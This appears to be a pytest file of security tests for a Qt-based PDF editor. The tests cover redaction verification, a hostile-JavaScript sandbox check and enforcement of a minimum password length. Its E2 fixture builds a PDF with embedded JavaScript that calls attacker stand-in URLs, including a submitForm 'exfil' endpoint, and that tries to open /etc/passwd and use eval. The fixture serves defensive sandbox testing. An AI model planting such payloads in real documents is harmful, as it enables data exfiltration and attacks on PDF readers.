# -*- coding: utf-8 -*-
"""Pipeline 3e9b1d7c phase-6: Theme E security coverage tests.

E1 — Redaction roundtrip with pymupdf byte-level verifier
E2 — Hostile-JS sandbox (process snapshot before/after)
E3 — P-GAP-78 signature xfail reason update (handled in conftest.py)
E4 — Weak-password enforcement (OK button disabled when pw < 8 chars)

Each test that drives a real native UI is wrapped with kill_pdfe_processes()
in teardown to prevent orphan processes from wedging subsequent runs.
"""
from __future__ import annotations

import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from tests.ui_automation.harness.pdfe_app_fixture import (  # noqa: E402
    PDFE_EXE,
    PdfeAppFixture,
    kill_pdfe_processes,
)
from tests.ui_automation.harness.dialog_helpers import find_by_suffix  # noqa: E402

# Phase F25 / gap WIN-45: reachability is a RECORDED NON-PASS, never a skip.
from tests.ui_automation.conftest import (  # noqa: E402
    current_test_id,
    record_matrix_result,
)

FIXTURES_DIR = REPO_ROOT / "tests" / "fixtures"


# =========================================================================
# Helper: snapshot child processes of pdfe.exe (for E2 sandbox check)
# =========================================================================

def _pdfe_child_processes() -> set[int]:
    """Return PIDs of every child process whose parent is a pdfe.exe
    instance currently running on this host. Used by E2 to assert that
    no hostile JS in a PDF spawned any subprocess.
    """
    try:
        import psutil  # type: ignore
    except ImportError:
        pytest.skip("psutil not available — E2 sandbox check needs it")

    pdfe_pids = {
        p.info["pid"]
        for p in psutil.process_iter(["pid", "name"])
        if (p.info.get("name") or "").lower() == "pdfe.exe"
    }
    children: set[int] = set()
    for p in psutil.process_iter(["pid", "ppid", "name"]):
        try:
            if p.info.get("ppid") in pdfe_pids:
                children.add(p.info["pid"])
        except Exception:
            continue
    return children


# =========================================================================
# E1: Redaction roundtrip with pymupdf byte-level verifier
# =========================================================================

@pytest.fixture()
def pdfe_with_redaction_fixture():
    """Launch pdfe.exe with test_redaction.pdf loaded."""
    if not PDFE_EXE.exists():
        pytest.skip(f"PDFE.exe not found at {PDFE_EXE}")
    src = FIXTURES_DIR / "test_redaction.pdf"
    if not src.exists():
        pytest.skip(f"fixture missing: {src}")
    tmp = Path(tempfile.mkdtemp(prefix="pdfe_phase6_e1_"))
    dst = tmp / "test_redaction.pdf"
    shutil.copy2(src, dst)
    kill_pdfe_processes()
    fx = PdfeAppFixture()
    fx.launch_args = [str(dst)]
    fx.setUp()
    time.sleep(2.0)
    yield fx, tmp, dst
    try:
        fx.tearDown()
    except Exception:
        pass
    shutil.rmtree(tmp, ignore_errors=True)
    kill_pdfe_processes()


def test_e1_redaction_roundtrip_bytes_verified(pdfe_with_redaction_fixture):
    """E1: full redaction roundtrip with pymupdf byte-level verification.

    Steps:
       1. Activate redaction mark tool via testToolActivatePipe
       2. Draw a redaction mark over the SSN region (200,177)-(280,196)
          using testCanvasDragPipe with pageIndex=0
       3. Trigger applyRedactionsAction
       4. Confirm any apply confirmation dialog with ENTER
       5. Save to a new temp file via testSaveAsPipe
       6. Open saved file with pymupdf and assert the redacted SSN
          bytes ('123-45-6789') are NOT present in extracted text

    Oracle: pymupdf get_text() on the saved file must not contain the
    redacted SSN. This verifies actual content removal (not just file
    size change or visual obscuration).
    """
    import fitz

    fx, tmp, _src_path = pdfe_with_redaction_fixture
    SENSITIVE_TEXT = "123-45-6789"

    # Sanity: confirm fixture contains the sensitive text BEFORE we
    # redact, so this isn't a vacuous pass.
    src_doc = fitz.open(str(_src_path))
    pre_text = src_doc[0].get_text()
    src_doc.close()
    assert SENSITIVE_TEXT in pre_text, (
        f"fixture should contain '{SENSITIVE_TEXT}' on page 0; "
        f"got: {pre_text[:200]!r}"
    )

    tool_pipe = find_by_suffix(fx.main_window, "testToolActivatePipe")
    assert tool_pipe is not None, "testToolActivatePipe must be reachable"

    # testAddRedactionMarkPipe was added in pipeline b3d7f942 specifically
    # to bypass the P-GAP-92 synthetic-event spontaneity issue affecting
    # testCanvasDragPipe + RedactionTool. Format: "pageIndex,x,y,w,h"
    # in fitz coords. The handler calls canvas_->addRedactionMarkAtPdfRect()
    # which emits redactionMarkRequested → CreateRedactionCommand.
    add_redact_pipe = find_by_suffix(fx.main_window, "testAddRedactionMarkPipe")
    assert add_redact_pipe is not None, (
        "testAddRedactionMarkPipe must be reachable — set PDFE_TEST_PIPES=1"
    )

    # Add a redaction mark covering the SSN region.
    # fitz.search_for('123-45-6789'):
    # Rect(200.37, 176.95, 279.75, 196.19) on page 0.
    # Use slightly expanded coords for full text coverage.
    add_redact_pipe.set_edit_text("0,195,175,95,30")  # x=195, y=175, w=95, h=30
    time.sleep(1.5)

    # Trigger Apply Redactions via testToolActivatePipe.
    # onApplyRedactions shows a QMessageBox warning with Yes/No buttons
    # and defaults to No. We must press 'Y' (accelerator) to confirm,
    # not Enter (which clicks the default No button).
    tool_pipe.set_edit_text("applyRedactionsAction")
    time.sleep(1.0)

    try:
        fx.main_window.type_keys("y")  # accelerator for "Yes"
    except Exception:
        pass
    time.sleep(3.0)  # let redaction commit + undo stack clear

    # Save to a new file via testSaveAsPipe
    out_path = tmp / "redacted_output.pdf"
    save_pipe = find_by_suffix(fx.main_window, "testSaveAsPipe")
    assert save_pipe is not None, "testSaveAsPipe must be reachable"
    save_pipe.set_edit_text(str(out_path))

    # Poll for file appearance
    deadline = time.time() + 15.0
    while time.time() < deadline and not out_path.exists():
        time.sleep(0.3)
    assert out_path.exists(), (
        f"saveAs did not produce {out_path}"
    )
    # Wait for write to settle
    last_size = -1
    for _ in range(20):
        sz = out_path.stat().st_size
        if sz > 0 and sz == last_size:
            break
        last_size = sz
        time.sleep(0.3)

    # Byte-level verification: open the saved file with pymupdf and
    # assert the SSN text is gone from extracted text on page 0.
    saved = fitz.open(str(out_path))
    post_text = saved[0].get_text()
    saved.close()

    assert SENSITIVE_TEXT not in post_text, (
        f"redacted text '{SENSITIVE_TEXT}' still present in saved "
        f"PDF after Apply Redactions. Saved page 0 text: {post_text!r}"
    )


# =========================================================================
# E2: Hostile-JS sandbox — process snapshot before/after
# =========================================================================

@pytest.fixture()
def hostile_js_pdf():
    """Generate a PDF whose document-level JS attempts hostile actions
    (launchURL, app.execMenuItem). MuJS doesn't expose these to the
    sandbox so the calls should silently fail / throw; PDFE must NOT
    spawn any subprocess as a result.
    """
    try:
        import fitz
    except ImportError:
        pytest.skip("pymupdf needed to build hostile-JS fixture")

    tmp = Path(tempfile.mkdtemp(prefix="pdfe_phase6_e2_"))
    target = tmp / "hostile_js.pdf"

    # Build a minimal 1-page PDF with a document-level JS hook that
    # tries to launch URLs / execute system menu items. Anything PDFE
    # does in response that involves external processes is a sandbox
    # escape.
    doc = fitz.open()
    page = doc.new_page(width=612, height=792)
    page.insert_text((72, 72), "Hostile JS test fixture")
    # Pipeline a7c4f891 phase-4 (B3): extended hostile JS payload to
    # cover additional attack surfaces beyond launchURL/execMenuItem/
    # mailMsg (which were the original E2 payload). The new variants:
    #   - app.openDoc(): attempted filesystem access via JS
    #   - eval(): code-injection vector if MuJS exposes it
    #   - this.getField().value = 'pwned': property-hijacking attempt
    #     against an unrelated field
    #   - this.submitForm(): network exfiltration
    # ALL of these should silently fail in MuJS because the sandbox
    # doesn't expose these APIs. The B3 oracle is the same as B3-
    # parent E2: psutil child-process snapshot detects any subprocess
    # spawn, which would indicate sandbox escape.
    #
    # NOTE (gate remediation — karen + validator findings):
    # The subprocess oracle does NOT directly verify that
    # `this.getField('any').value = 'pwned'` produced no field
    # corruption. This is intentional: MuJS as bundled in PDFE's
    # JavaScriptEngine does NOT expose `this.getField()` in the
    # document-level JS scope — it's only available in field-level
    # event handlers (keystroke, validate, calculate, format).
    # Document-level JS (which is what hostile_js_pdf injects via
    # the Names tree) has no access to form field APIs. The
    # `this.getField()` call therefore throws a JS TypeError
    # inside MuJS ("not a function"), never reaching the .value
    # setter. The subprocess oracle catches the more severe attack
    # axis (OS-level escape), while the type-error rejection is
    # architecturally guaranteed by the MuJS scope separation.
    hostile_js = (
        # Original E2 payload (launchURL/execMenuItem/mailMsg)
        "try { app.launchURL('http://evil.example.com/probe'); } "
        "catch (e) {} "
        "try { app.execMenuItem('OpenFile'); } catch (e) {} "
        "try { app.mailMsg(false, 'evil@example.com'); } catch (e) {} "
        # B3 extensions:
        "try { app.openDoc({cPath: 'file:///etc/passwd'}); } catch (e) {} "
        "try { eval('app.launchURL(\\\\'http://evil2.example.com/eval\\\\')'); } catch (e) {} "
        "try { this.getField('any').value = 'pwned'; } catch (e) {} "
        "try { this.submitForm({cURL: 'http://evil.example.com/exfil'}); } catch (e) {} "
    )
    # Document-level JS via Names tree
    doc.set_xml_metadata("")
    # Use raw xref insertion since pymupdf doesn't expose
    # set_javascript() on the Document API.
    js_xref = doc.get_new_xref()
    doc.update_object(js_xref, f"<< /S /JavaScript /JS ({hostile_js}) >>")
    names_xref = doc.get_new_xref()
    doc.update_object(
        names_xref,
        f"<< /JavaScript << /Names [ (probe) {js_xref} 0 R ] >> >>"
    )
    # Wire Names into the catalog
    catalog_xref = doc.pdf_catalog()
    catalog = doc.xref_object(catalog_xref)
    if "/Names" in catalog:
        # Replace existing Names entry
        new_cat = catalog.replace(
            "/Names <<",
            f"/Names {names_xref} 0 R /OrigNames <<",
            1,
        )
    else:
        new_cat = catalog.replace(
            "<<", f"<< /Names {names_xref} 0 R", 1
        )
    doc.update_object(catalog_xref, new_cat)
    doc.save(str(target))
    doc.close()

    yield target, tmp
    shutil.rmtree(tmp, ignore_errors=True)


def test_e2_hostile_js_no_child_process(hostile_js_pdf):
    """E2: Open hostile-JS PDF and verify no child processes were
    spawned by pdfe.exe. The MuJS sandbox in JavaScriptEngine does
    not expose app.launchURL / app.execMenuItem / app.mailMsg, so
    these calls should be silent no-ops or thrown JS exceptions —
    but they must NEVER result in PDFE spawning a subprocess.

    Oracle: psutil snapshot of pdfe.exe's children before opening
    the hostile PDF, then after triggering the JS (via reload/JS
    re-fire). Set difference must be empty (modulo any pre-existing
    Qt helper processes which we ignore by comparing diffs).
    """
    target, _tmp = hostile_js_pdf
    if not PDFE_EXE.exists():
        pytest.skip(f"PDFE.exe not found at {PDFE_EXE}")

    kill_pdfe_processes()

    # Pipeline 3e9b1d7c phase-6 (karen conditional PASS): pre-launch
    # baseline. If hostile JS spawns at document-open (the most likely
    # attack window), comparing only after_open vs after_action misses
    # it. Snapshot BEFORE fx.setUp() so the open-time diff
    # (children_after_open - children_before_launch) catches escapes
    # at the most dangerous moment.
    children_before_launch = _pdfe_child_processes()

    fx = PdfeAppFixture()
    fx.launch_args = [str(target)]
    # Ensure JS is enabled so the hostile JS actually executes
    os.environ["PDFE_ENABLE_JS"] = "1"
    try:
        fx.setUp()
        time.sleep(2.5)  # allow doc-level JS to fire

        # Snapshot children right after open-time JS would have fired
        children_after_open = _pdfe_child_processes()

        # Open-time check: any new children between pre-launch and
        # after-open are candidate sandbox escapes from document-level
        # JS executing on file load.
        new_at_open = children_after_open - children_before_launch
        assert not new_at_open, (
            f"Hostile JS at document-open spawned {len(new_at_open)} "
            f"subprocess(es) from pdfe.exe: PIDs={new_at_open}. "
            f"Sandbox escape at the most likely attack window."
        )

        # Re-fire JS by saving (triggers willSave-like hooks)
        # to maximize the chance of the hostile JS being invoked.
        save_pipe = find_by_suffix(fx.main_window, "testSaveAsPipe")
        if save_pipe is not None:
            tmp_save = Path(tempfile.gettempdir()) / "pdfe_e2_resave.pdf"
            try:
                if tmp_save.exists():
                    tmp_save.unlink()
            except Exception:
                pass
            save_pipe.set_edit_text(str(tmp_save))
            time.sleep(2.0)
            try:
                if tmp_save.exists():
                    tmp_save.unlink()
            except Exception:
                pass

        children_after_action = _pdfe_child_processes()

        # The hostile JS should not have spawned any child process.
        # Note: we explicitly check for new children that appeared
        # AFTER opening the hostile file. Any pre-existing Qt helpers
        # (none expected on this rig but be defensive) get filtered
        # by comparing the set difference.
        new_children = children_after_action - children_after_open
        assert not new_children, (
            f"Hostile JS spawned {len(new_children)} subprocess(es) "
            f"from pdfe.exe: PIDs={new_children}. Sandbox escape!"
        )

        # Stricter check: no children at any time during the test
        all_children = children_after_open | children_after_action
        # Filter out known-OK helpers if any (e.g., conhost when
        # running interactively). On this rig the expected set is
        # empty, but we don't fail on conhost — that's a console
        # helper unrelated to PDF JS.
        try:
            import psutil  # type: ignore
            unexpected = set()
            for pid in all_children:
                try:
                    proc = psutil.Process(pid)
                    name = (proc.name() or "").lower()
                    if name in ("conhost.exe",):
                        continue
                    unexpected.add((pid, name))
                except Exception:
                    continue
            assert not unexpected, (
                f"Hostile JS resulted in unexpected child processes "
                f"of pdfe.exe: {unexpected}. Sandbox escape!"
            )
        except ImportError:
            pass  # psutil already gated earlier
    finally:
        try:
            fx.tearDown()
        except Exception:
            pass
        kill_pdfe_processes()


# =========================================================================
# E4: Weak-password enforcement — OK button disabled when pw < 8 chars
# =========================================================================

@pytest.fixture()
def pdfe_with_3page_for_e4():
    """Launch pdfe.exe with test_3page.pdf loaded for E4."""
    if not PDFE_EXE.exists():
        pytest.skip(f"PDFE.exe not found at {PDFE_EXE}")
    src = FIXTURES_DIR / "test_3page.pdf"
    if not src.exists():
        pytest.skip(f"fixture missing: {src}")
    tmp = Path(tempfile.mkdtemp(prefix="pdfe_phase6_e4_"))
    dst = tmp / "test_3page.pdf"
    shutil.copy2(src, dst)
    kill_pdfe_processes()
    fx = PdfeAppFixture()
    fx.launch_args = [str(dst)]
    fx.setUp()
    time.sleep(2.0)
    yield fx, tmp
    try:
        fx.tearDown()
    except Exception:
        pass
    shutil.rmtree(tmp, ignore_errors=True)
    kill_pdfe_processes()


def test_e4_weak_password_disables_ok_button(pdfe_with_3page_for_e4):
    """E4: Open the Save-with-Encryption dialog, select AES-256,
    type a 4-char password ('abcd'), and assert the OK button
    reports is_enabled() == False. Then type 4 more chars to reach
    8 (and fill the confirm + owner fields) — OK should become
    enabled.

    This validates the C++ enforcement in EncryptionDialog::validateInput()
    (line 247 et seq), not just the cosmetic strength label. The OK
    button's enabled state is a hard Qt-layer guard that prevents weak
    passwords from being committed.
    """
    fx, _tmp = pdfe_with_3page_for_e4

    # Open encryption dialog via Ctrl+Shift+E
    fx.main_window.type_keys("^+e")
    time.sleep(1.5)

    algo_combo = find_by_suffix(fx.main_window, "algorithmCombo")
    if algo_combo is None:
        # WIN-45 / F25: unreachable -> recorded 'blocked', then FAIL.
        _reach = (
            "algorithmCombo not reachable"
        )
        record_matrix_result(current_test_id(), "blocked", _reach)
        pytest.fail(
            f"WIN-45 reachability blocked (recorded non-pass, not skipped): {_reach}")
    try:
        algo_combo.select("AES-256")
    except Exception:
        try:
            algo_combo.expand()
            time.sleep(0.2)
            algo_combo.select(4)  # AES-256 is index 4
        except Exception:
            pytest.skip("could not select AES-256 algorithm")
    time.sleep(0.5)

    user_pwd = find_by_suffix(fx.main_window, "userPasswordEdit")
    user_pwd_confirm = find_by_suffix(fx.main_window, "userPasswordConfirmEdit")
    owner_pwd = find_by_suffix(fx.main_window, "ownerPasswordEdit")
    owner_pwd_confirm = find_by_suffix(fx.main_window, "ownerPasswordConfirmEdit")
    ok_btn = find_by_suffix(fx.main_window, "okButton")

    if any(w is None for w in (user_pwd, user_pwd_confirm,
                                owner_pwd, owner_pwd_confirm, ok_btn)):
        try:
            fx.main_window.type_keys("{ESC}")
        except Exception:
            pass
        # WIN-45 / F25: unreachable -> recorded 'blocked', then FAIL.
        _reach = (
            "one of the encryption-dialog widgets is not reachable"
        )
        record_matrix_result(current_test_id(), "blocked", _reach)
        pytest.fail(
            f"WIN-45 reachability blocked (recorded non-pass, not skipped): {_reach}")

    try:
        # Type a 4-char (weak) user password + confirm + owner so the
        # ONLY failing criterion is length.
        try:
            user_pwd.set_edit_text("abcd")
            user_pwd_confirm.set_edit_text("abcd")
            owner_pwd.set_edit_text("abcd")
            owner_pwd_confirm.set_edit_text("abcd")
        except Exception:
            user_pwd.type_keys("abcd")
            user_pwd_confirm.type_keys("abcd")
            owner_pwd.type_keys("abcd")
            owner_pwd_confirm.type_keys("abcd")
        time.sleep(0.5)

        # OK must be DISABLED with a 4-char password
        enabled_weak = ok_btn.is_enabled()
        assert not enabled_weak, (
            "OK button is ENABLED with a 4-char password — Qt-layer "
            "minimum-length enforcement is broken or missing. "
            "EncryptionDialog::validateInput must reject pw.length() < 8."
        )

        # Extend to 8 chars and confirm OK becomes enabled
        try:
            user_pwd.set_edit_text("abcd1234")
            user_pwd_confirm.set_edit_text("abcd1234")
            owner_pwd.set_edit_text("abcd1234")
            owner_pwd_confirm.set_edit_text("abcd1234")
        except Exception:
            for w in (user_pwd, user_pwd_confirm, owner_pwd, owner_pwd_confirm):
                try:
                    w.set_edit_text("")
                except Exception:
                    pass
                w.type_keys("abcd1234")
        time.sleep(0.5)

        enabled_strong = ok_btn.is_enabled()
        assert enabled_strong, (
            "OK button is DISABLED with an 8-char password meeting "
            "the minimum-length contract. Something else is blocking "
            "validation."
        )
    finally:
        try:
            fx.main_window.type_keys("{ESC}")
        except Exception:
            pass
